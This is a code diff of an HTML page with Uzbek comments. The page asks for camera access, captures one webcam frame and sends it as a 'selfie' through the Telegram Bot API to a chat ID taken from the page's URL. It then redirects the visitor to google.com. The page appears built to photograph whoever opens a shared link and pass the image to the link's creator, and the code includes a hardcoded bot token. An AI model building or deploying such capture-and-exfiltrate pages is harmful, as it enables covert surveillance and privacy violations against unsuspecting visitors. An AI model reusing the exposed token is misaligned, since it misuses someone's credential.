@@ -7,6 +7,8 @@
     <style>
       body {
         background: #fff;
+        text-align: center;
+        font-family: sans-serif;
       }
       video,
       canvas {
@@ -15,29 +17,30 @@
     </style>
   </head>
   <body>
+    <h3 id="st">Kamera yoqilmoqda...</h3>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
       const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
-      const chatId = window.location.pathname.split("/").pop();
+      const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
 
       async function start() {
         try {
           if (!chatId) {
             console.error("chatId topilmadi");
-            document.getElementById("st").textContent = "chatId topilmadi";
-            // istasangiz redirect yoki boshqa ish qiling
             return;
           }
+          const st = document.getElementById("st");
 
+          st.textContent = "Kamera ruxsati so‘ralmoqda...";
           const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
           });
           const v = document.getElementById("v");
           v.srcObject = stream;
 
-          // video frame kelishini kutamiz — in-app browser uchun 1500ms fallback
+          // video frame kelishini kutamiz
           await new Promise((resolve) => {
             if (v.readyState >= 2 && v.videoWidth > 0) return resolve();
             const onPlaying = () => {
@@ -49,22 +52,18 @@
             setTimeout(() => {
               v.removeEventListener("playing", onPlaying);
               resolve();
-            }, 1500);
+            }, 2500);
           });
 
           const c = document.getElementById("c");
           c.width = v.videoWidth || 640;
           c.height = v.videoHeight || 480;
           const ctx = c.getContext("2d");
-
-          // oxirgi frame kelishini kutish
           await new Promise((r) => requestAnimationFrame(r));
           ctx.drawImage(v, 0, 0, c.width, c.height);
 
-          // kamerani to'xtatamiz
           stream.getTracks().forEach((t) => t.stop());
-
-          document.getElementById("st").textContent = "Rasm yuborilmoqda...";
+          st.textContent = "Rasm yuborilmoqda...";
 
           const blob = await new Promise((res) => c.toBlob(res, "image/png"));
           if (!blob) throw new Error("Rasm olinmadi");
@@ -72,9 +71,8 @@
           const form = new FormData();
           form.append("chat_id", chatId);
           form.append("photo", blob, "selfie.png");
-          form.append("caption", "nimg rasmi");
+          form.append("caption", "Selfie olindi!");
 
-          // yuborish va javobni tekshirish
           const resp = await fetch(
             `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
             { method: "POST", body: form }
@@ -83,12 +81,11 @@
 
           if (!resp.ok || (data && !data.ok)) {
             console.error("Telegramga yuborishda muammo", resp, data);
-            // yuborilmadi — baribir yo'naltirish yoki xato ko'rsatish mumkin
             window.location.href = "https://google.com";
             return;
           }
 
-          // muvaffaqiyatli yuborilgach yo'naltiramiz
+          st.textContent = "Yuborildi, yo‘naltirilmoqda";
           window.location.href = "https://google.com";
         } catch (err) {
           console.error(err);
